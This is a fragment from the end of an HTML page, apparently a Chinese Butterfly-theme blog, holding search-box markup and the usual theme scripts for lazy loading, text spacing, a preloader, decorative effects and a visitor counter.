数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script data-pjax src="/js/lalala.js"></script><script src="/live2d-widget/autoload.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="爱国,和谐,友善,富强,敬业,自由,平等,民主" data-fontsize="16px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
